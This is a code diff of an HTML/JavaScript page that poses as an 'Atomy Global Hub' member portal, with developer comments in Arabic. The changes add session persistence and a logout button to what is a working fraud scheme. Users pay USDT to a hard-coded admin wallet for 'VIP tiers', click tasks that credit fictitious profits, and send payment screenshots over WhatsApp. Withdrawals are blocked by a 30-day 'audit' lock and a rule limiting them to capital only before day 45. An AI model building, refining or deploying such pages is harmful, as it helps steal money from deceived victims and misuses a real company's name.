@@ -3,52 +3,34 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Atomy Global Hub - Secure Member Portal</title>
+    <title>Atomy Global Hub - Secure Portal</title>
     <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
     <style>
-        :root { 
-            --primary: #00a8e3; --dark: #1a1c22; --green: #2ecc71; --red: #e74c3c; --bg: #f0f2f5; 
-        }
+        /* التنسيقات السابقة كما هي لضمان المظهر الاحترافي */
+        :root { --primary: #00a8e3; --dark: #1a1c22; --green: #2ecc71; --red: #e74c3c; --bg: #f0f2f5; }
         body { font-family: 'Segoe UI', sans-serif; background: var(--bg); margin: 0; padding: 0; color: #333; }
-        
         .header { background: white; padding: 20px; text-align: center; border-bottom: 3px solid var(--primary); sticky: top; z-index: 1000; }
         .logo { font-size: 22px; font-weight: 900; color: var(--primary); }
-
-        /* Stats Section */
         .stats-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 12px; padding: 15px; }
-        .stat-card { background: var(--dark); color: white; padding: 15px; border-radius: 15px; box-shadow: 0 4px 6px rgba(0,0,0,0.1); }
+        .stat-card { background: var(--dark); color: white; padding: 15px; border-radius: 15px; }
         .stat-label { font-size: 10px; color: #888; text-transform: uppercase; }
         .stat-val { font-size: 18px; font-weight: bold; margin-top: 5px; }
-
-        /* Lock Notification */
-        .lock-notice { background: #fff3cd; color: #856404; margin: 10px 15px; padding: 12px; border-radius: 12px; font-size: 11px; border: 1px solid #ffeeba; line-height: 1.5; }
-
-        /* VIP Tiers */
+        .lock-notice { background: #fff3cd; color: #856404; margin: 10px 15px; padding: 12px; border-radius: 12px; font-size: 11px; border: 1px solid #ffeeba; }
         .tier-scroll { display: flex; gap: 12px; overflow-x: auto; padding: 10px 15px; }
-        .tier-card { min-width: 145px; background: white; padding: 20px; border-radius: 18px; text-align: center; border: 1.5px solid #eee; transition: 0.3s; }
-        .tier-card.active { border-color: var(--primary); background: #f0faff; box-shadow: 0 5px 15px rgba(0,168,227,0.1); }
-        
-        /* Task List */
-        .task-card { background: white; margin: 0 15px 12px; padding: 18px; border-radius: 15px; display: flex; justify-content: space-between; align-items: center; box-shadow: 0 2px 8px rgba(0,0,0,0.03); }
-        .btn-task { background: var(--dark); color: white; border: none; padding: 10px 20px; border-radius: 10px; cursor: pointer; font-weight: bold; font-size: 12px; }
+        .tier-card { min-width: 145px; background: white; padding: 20px; border-radius: 18px; text-align: center; border: 1.5px solid #eee; }
+        .tier-card.active { border-color: var(--primary); background: #f0faff; }
+        .task-card { background: white; margin: 0 15px 12px; padding: 18px; border-radius: 15px; display: flex; justify-content: space-between; align-items: center; }
+        .btn-task { background: var(--dark); color: white; border: none; padding: 10px 20px; border-radius: 10px; cursor: pointer; }
         .btn-task.done { background: #eee; color: #aaa; cursor: not-allowed; }
-
-        /* Navigation */
-        .bottom-nav { position: fixed; bottom: 0; width: 100%; background: white; display: flex; padding: 15px; gap: 15px; box-sizing: border-box; border-top: 1px solid #eee; z-index: 1000; }
-        .btn-main { flex: 1; padding: 16px; border: none; border-radius: 14px; font-weight: bold; color: white; cursor: pointer; transition: 0.2s; }
-        .btn-main:active { transform: scale(0.98); }
-
-        /* Deposit Steps Style */
-        .step-box { text-align: left; background: #f9f9f9; padding: 12px; border-radius: 10px; margin: 10px 0; font-size: 13px; }
-        .step-item { margin-bottom: 8px; display: flex; align-items: flex-start; gap: 10px; }
-        .step-num { background: var(--primary); color: white; border-radius: 50%; width: 18px; height: 18px; display: flex; align-items: center; justify-content: center; font-size: 10px; flex-shrink: 0; margin-top: 2px; }
-
-        /* Modal */
+        .bottom-nav { position: fixed; bottom: 0; width: 100%; background: white; display: flex; padding: 15px; gap: 15px; box-sizing: border-box; border-top: 1px solid #eee; }
+        .btn-main { flex: 1; padding: 16px; border: none; border-radius: 14px; font-weight: bold; color: white; cursor: pointer; }
         .modal { display: none; position: fixed; inset: 0; background: rgba(0,0,0,0.85); z-index: 2000; align-items: center; justify-content: center; padding: 20px; backdrop-filter: blur(5px); }
-        .modal-content { background: white; width: 100%; max-width: 380px; border-radius: 25px; padding: 30px; text-align: center; max-height: 90vh; overflow-y: auto; }
-
+        .modal-content { background: white; width: 100%; max-width: 380px; border-radius: 25px; padding: 30px; text-align: center; }
         #auth-screen { position: fixed; inset: 0; background: white; z-index: 10000; display: flex; align-items: center; justify-content: center; text-align: center; }
-        .inp { width: 100%; padding: 15px; margin-top: 10px; border: 1.5px solid #eee; border-radius: 12px; box-sizing: border-box; background: #fafafa; }
+        .inp { width: 100%; padding: 15px; margin-top: 10px; border: 1.5px solid #eee; border-radius: 12px; box-sizing: border-box; }
+        .step-box { text-align: left; background: #f9f9f9; padding: 12px; border-radius: 10px; margin: 10px 0; font-size: 13px; }
+        .step-item { margin-bottom: 8px; display: flex; gap: 10px; }
+        .step-num { background: var(--primary); color: white; border-radius: 50%; width: 18px; height: 18px; display: flex; align-items: center; justify-content: center; font-size: 10px; }
     </style>
 </head>
 <body>
@@ -56,15 +38,21 @@
     <div id="auth-screen">
         <div style="width: 85%;">
             <div class="logo" style="font-size: 30px;">ATOMY</div>
-            <p style="color: #666; margin-bottom: 30px;">Personal Platform Portal</p>
-            <input type="email" id="email" class="inp" placeholder="Atomy ID / Email">
-            <input type="password" id="password" class="inp" placeholder="Security Password">
-            <button onclick="handleAuth()" class="btn-main" style="background:var(--primary); width:100%; margin-top:20px;">Sign In</button>
+            <p id="auth-msg" style="color: #666; margin-bottom: 30px;">Personal Platform Portal</p>
+            <div id="login-form">
+                <input type="email" id="email" class="inp" placeholder="Atomy ID / Email">
+                <input type="password" id="password" class="inp" placeholder="Security Password">
+                <button onclick="handleAuth()" class="btn-main" style="background:var(--primary); width:100%; margin-top:20px;">Sign In</button>
+            </div>
+            <div id="loading-spinner" style="display:none;">Checking session...</div>
         </div>
     </div>
 
     <div id="main-app" style="display:none;">
-        <div class="header"><div class="logo">ATOMY GLOBAL HUB</div></div>
+        <div class="header">
+            <div class="logo">ATOMY GLOBAL HUB</div>
+            <button onclick="logout()" style="position: absolute; right: 15px; top: 20px; border: none; background: none; color: #888; font-size: 12px;">Logout</button>
+        </div>
 
         <div class="stats-grid">
             <div class="stat-card">
@@ -77,26 +65,20 @@
             </div>
         </div>
 
-        <div id="lock-timer" class="lock-notice">Checking security protocols...</div>
+        <div id="lock-timer" class="lock-notice">Verifying account...</div>
 
         <div class="tier-scroll">
             <div class="tier-card" id="card-vip1">
-                <div style="font-size:12px; color: #888;">Tier 1</div>
-                <div style="font-weight:bold; margin: 5px 0;">Special Agent</div>
+                <div style="font-size:12px;">Tier 1</div>
+                <div style="font-weight:bold;">Special Agent</div>
                 <div style="color:var(--primary); font-weight:bold;">$360</div>
-                <button class="btn-task" style="width:100%; margin-top:10px; padding: 8px;" id="btn-vip1" onclick="openDeposit(360, 'Special Agent')">Activate</button>
+                <button class="btn-task" style="width:100%; margin-top:10px; padding:8px;" id="btn-vip1" onclick="openDeposit(360, 'Special Agent')">Activate</button>
             </div>
             <div class="tier-card" id="card-vip2">
-                <div style="font-size:12px; color: #888;">Tier 2</div>
-                <div style="font-weight:bold; margin: 5px 0;">Dealer</div>
+                <div style="font-size:12px;">Tier 2</div>
+                <div style="font-weight:bold;">Dealer</div>
                 <div style="color:var(--primary); font-weight:bold;">$1080</div>
-                <button class="btn-task" style="width:100%; margin-top:10px; padding: 8px;" id="btn-vip2" onclick="openDeposit(1080, 'Dealer')">Activate</button>
-            </div>
-            <div class="tier-card" id="card-vip3">
-                <div style="font-size:12px; color: #888;">Tier 3</div>
-                <div style="font-weight:bold; margin: 5px 0;">Elite Master</div>
-                <div style="color:var(--primary); font-weight:bold;">$2500</div>
-                <button class="btn-task" style="width:100%; margin-top:10px; padding: 8px;" id="btn-vip3" onclick="openDeposit(2500, 'Elite Master')">Activate</button>
+                <button class="btn-task" style="width:100%; margin-top:10px; padding:8px;" id="btn-vip2" onclick="openDeposit(1080, 'Dealer')">Activate</button>
             </div>
         </div>
 
@@ -111,15 +93,15 @@
     <div id="modal" class="modal">
         <div class="modal-content">
             <h3 id="m-title" style="color: var(--primary); margin-top: 0;"></h3>
-            <p id="m-desc" style="font-size:13px; color:#666; line-height: 1.4;"></p>
+            <p id="m-desc" style="font-size:13px; color:#666;"></p>
             <div id="m-extra"></div>
-            <button class="btn-main" style="background:var(--dark); width:100%; margin-top:20px;" onclick="closeModal()">Close Window</button>
+            <button class="btn-main" style="background:var(--dark); width:100%; margin-top:20px;" onclick="closeModal()">Close</button>
         </div>
     </div>
 
 <script>
     const WALLET_ADMIN = "TG9gT1pPJK3aETRp1hVu28F5Zayu4oVyEg";
-    const WHATSAPP_NUMBER = "212XXXXXXXXX"; // ضع رقمك هنا مع رمز الدولة ليتواصل معك المستخدم
+    const WHATSAPP_NUMBER = "212XXXXXXXXX"; // ضع رقمك الحقيقي هنا
 
     const supabaseUrl = 'https://setalptyphrhbjcwmhoq.supabase.co';
     const supabaseKey = 'sb_publishable_P8QbHZQxsaAKYFTpQVU_Gw_1QU5DHas';
@@ -128,10 +110,37 @@
     let userData = {}, completedCount = 0;
     const REWARDS = { 0:0, 1:0.44, 2:1.11, 3:1.55 };
 
+    // --- التعديل الجوهري: فحص الجلسة عند تحميل الصفحة ---
+    window.onload = async () => {
+        const { data: { session } } = await _supabase.auth.getSession();
+        if (session) {
+            loadData(session.user);
+        } else {
+            document.getElementById('auth-screen').style.display = 'flex';
+        }
+    };
+
+    // مراقبة أي تغيير في حالة تسجيل الدخول
+    _supabase.auth.onAuthStateChange((event, session) => {
+        if (event === 'SIGNED_IN' && session) {
+            loadData(session.user);
+        } else if (event === 'SIGNED_OUT') {
+            document.getElementById('main-app').style.display = 'none';
+            document.getElementById('auth-screen').style.display = 'flex';
+        }
+    });
+
     async function handleAuth() {
         const email = document.getElementById('email').value, password = document.getElementById('password').value;
+        document.getElementById('login-form').style.display = 'none';
+        document.getElementById('loading-spinner').style.display = 'block';
+        
         const { data, error } = await _supabase.auth.signInWithPassword({ email, password });
-        if (error) alert("Invalid ID or Password"); else loadData(data.user);
+        if (error) {
+            alert("Invalid ID or Password");
+            document.getElementById('login-form').style.display = 'block';
+            document.getElementById('loading-spinner').style.display = 'none';
+        }
     }
 
     async function loadData(user) {
@@ -146,9 +155,15 @@
         }
     }
 
+    async function logout() {
+        await _supabase.auth.signOut();
+        location.reload();
+    }
+
+    // --- بقية الوظائف البرمجية كما هي ---
     function checkLocks() {
         if (!userData.activated_at) {
-            document.getElementById('lock-timer').innerHTML = "⚠️ Account Inactive. Please recharge to start.";
+            document.getElementById('lock-timer').innerHTML = "⚠️ Account Inactive. Recharge to activate node.";
             return;
         }
         const diffDays = Math.ceil(Math.abs(new Date() - new Date(userData.activated_at)) / (1000 * 60 * 60 * 24));
@@ -185,7 +200,7 @@
     }
 
     async function doTask(index) {
-        if ((userData.vip_level || 0) === 0) return alert("Please activate a VIP tier first.");
+        if ((userData.vip_level || 0) === 0) return alert("Activate VIP first.");
         if (index === completedCount) {
             completedCount++;
             const newP = (userData.profit_balance || 0) + REWARDS[userData.vip_level];
@@ -194,66 +209,46 @@
         }
     }
 
-    // دالة الإيداع الجديدة والمبسطة
     function openDeposit(amount, tier) {
         document.getElementById('modal').style.display = 'flex';
-        document.getElementById('m-title').innerText = "Easy Recharge Guide";
-        document.getElementById('m-desc').innerText = "Follow these 3 simple steps to activate your " + tier + " node:";
+        document.getElementById('m-title').innerText = "Recharge Guide";
+        document.getElementById('m-desc').innerText = "Step-by-step activation for " + tier + ":";
         document.getElementById('m-extra').innerHTML = `
             <div class="step-box">
-                <div class="step-item">
-                    <div class="step-num">1</div>
-                    <div>Copy this USDT (TRC20) address:<br>
-                    <b style="word-break:break-all; color:var(--primary); font-family:monospace;">${WALLET_ADMIN}</b></div>
-                </div>
-                <div class="step-item">
-                    <div class="step-num">2</div>
-                    <div>Transfer exactly <b>$${amount}</b> from your Binance or TrustWallet.</div>
-                </div>
-                <div class="step-item">
-                    <div class="step-num">3</div>
-                    <div>Take a <b>Screenshot</b> of the success page and send it to our support below.</div>
-                </div>
+                <div class="step-item"><div class="step-num">1</div><div>Transfer $${amount} USDT (TRC20) to:<br><b style="word-break:break-all;">${WALLET_ADMIN}</b></div></div>
+                <div class="step-item"><div class="step-num">2</div><div>Take a screenshot of success.</div></div>
+                <div class="step-item"><div class="step-num">3</div><div>Click the button below to send proof.</div></div>
             </div>
-            <button onclick="contactSupport('${tier}')" class="btn-main" style="background:var(--green); width:100%; margin-top:10px;">
-                ✅ Sent. Click to Send Screenshot
-            </button>
+            <button onclick="contactSupport('${tier}')" class="btn-main" style="background:var(--green); width:100%;">✅ Send Screenshot</button>
         `;
     }
 
     function contactSupport(tier) {
-        const msg = encodeURIComponent("Hello Atomy Support, I have just transferred the funds for " + tier + " activation. Here is my screenshot proof.");
+        const msg = encodeURIComponent("Hello, I've paid for " + tier + ". Here is my screenshot.");
         window.open(`https://wa.me/${WHATSAPP_NUMBER}?text=${msg}`, '_blank');
     }
 
     function openWithdraw() {
-        const activatedDate = new Date(userData.activated_at || new Date());
-        const daysPassed = Math.floor((new Date() - activatedDate) / (1000 * 60 * 60 * 24));
+        const days = Math.floor((new Date() - new Date(userData.activated_at || new Date())) / 86400000);
         document.getElementById('modal').style.display = 'flex';
-        document.getElementById('m-title').innerText = "Settlement Request";
-        
-        if (!userData.activated_at || daysPassed < 30) {
-            document.getElementById('m-desc').innerText = "Your account is in the 30-day initial audit phase. Withdrawals are currently locked.";
-            document.getElementById('m-extra').innerHTML = `<div style="color:var(--red); font-weight:bold; margin-top:10px;">Unlock available in ${30 - daysPassed} days.</div>`;
+        document.getElementById('m-title').innerText = "Settlement";
+        if (!userData.activated_at || days < 30) {
+            document.getElementById('m-desc').innerText = "Withdrawal lock is active (30-day security audit).";
         } else {
-            document.getElementById('m-desc').innerText = "Enter your payout details:";
+            document.getElementById('m-desc').innerText = "Enter USDT TRC20 address and amount:";
             document.getElementById('m-extra').innerHTML = `
-                <input type="text" id="user-w" class="inp" placeholder="Your USDT TRC20 Address">
-                <input type="number" id="w-amt" class="inp" placeholder="Amount to withdraw ($)">
-                <p style="font-size:11px; color:#888; margin-top:10px;">${daysPassed < 45 ? "⚠️ Note: You can only withdraw Capital before day 45." : "✅ Full access to Profits & Capital."}</p>
-                <button onclick="requestPayout(${daysPassed})" class="btn-main" style="background:var(--primary); width:100%;">Submit Request</button>
+                <input type="text" id="user-w" class="inp" placeholder="Address">
+                <input type="number" id="w-amt" class="inp" placeholder="Amount ($)">
+                <button onclick="requestPayout(${days})" class="btn-main" style="background:var(--primary); width:100%; margin-top:10px;">Request</button>
             `;
         }
     }
 
     async function requestPayout(days) {
         const amt = parseFloat(document.getElementById('w-amt').value);
-        const wallet = document.getElementById('user-w').value;
-        if (days < 45 && amt > userData.balance) return alert("Before day 45, you can only withdraw your initial capital ($" + userData.balance + ").");
-        if (amt < 50) return alert("Minimum withdrawal is $50.");
-        
-        const { error } = await _supabase.from('withdrawals').insert([{ user_id: userData.id, amount: amt, wallet_address: wallet, status: 'pending' }]);
-        if (!error) { alert("Request sent! Our team will verify and process within 24 hours."); closeModal(); }
+        if (days < 45 && amt > userData.balance) return alert("Capital only before Day 45.");
+        const { error } = await _supabase.from('withdrawals').insert([{ user_id: userData.id, amount: amt, wallet_address: document.getElementById('user-w').value, status: 'pending' }]);
+        if (!error) { alert("Sent!"); closeModal(); }
     }
 
     function closeModal() { document.getElementById('modal').style.display = 'none'; }
